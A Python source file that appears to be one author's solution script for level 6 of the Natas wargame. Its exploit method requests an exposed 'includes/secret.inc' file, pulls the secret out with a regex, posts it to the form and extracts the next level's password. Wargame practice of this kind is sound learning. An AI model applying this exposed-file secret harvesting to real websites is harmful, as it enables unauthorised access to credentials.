import re
from src.natas.base_level import NatasLevel

class Level_06(NatasLevel):

  num = 6
  explanation = "On this level, inside source we have a route 'includes/secret.inc',\n     inside it it is the secrect we have to introduce to get the password."

  def exploit(self) -> str:

    resp_secret = self.session.get(self.base_url + "/includes/secret.inc")
    secret      = re.search(r"secret = \s*(.*)", resp_secret.text, re.MULTILINE).group(1).replace('"', '').replace(";", "")
    payload     = {
      "secret": f"{secret}",
      "submit": "Enviar Consulta"
    }
    resp        = self.session.post(self.base_url, data = payload)
    match       = re.search(r"natas7 is (\S+)", resp.text)

    return match.group(1)
